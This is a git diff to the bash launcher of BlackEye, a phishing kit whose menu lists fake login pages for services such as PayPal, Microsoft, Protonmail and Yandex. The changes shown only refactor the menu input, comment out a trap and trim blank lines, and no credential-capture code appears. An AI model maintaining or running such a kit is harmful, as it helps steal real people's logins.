@@ -11,19 +11,16 @@
 # PayPal,eBay,CryptoCurrency,Verizon,Drop Box,Adobe ID,Shopify,Messenger,TwitchMyspace,Badoo,VK,Yandex,devianART
 
 
-trap 'printf "\n";stop;exit 1' 2
-
+#trap 'printf "\n";stop;exit 1' 2
 
 dependencies() {
-
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
-
 }
 
-clear
+#clear
 
 menu() {
 
@@ -44,6 +41,10 @@ printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     
 printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m               ▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\n"
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m    \e[1;94m Maintained in : africana-framework\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m0\e[0m\e\e[1;92m]\e[0m\e[1;91m To Exit\e[0m\n"
+
+}
+
+userInput() {
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
@@ -180,8 +181,8 @@ createpage
 start
 
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-menu
+printf "\e[1;93m[!] Invalid option!\e[0m\n\n"
+userInput
 fi
 }
 
@@ -203,8 +204,6 @@ fi
 
 banner() {
 
-printf "\n"
-printf "\n"
 printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
@@ -440,4 +439,5 @@ done
 banner
 dependencies
 menu
+userInput
 
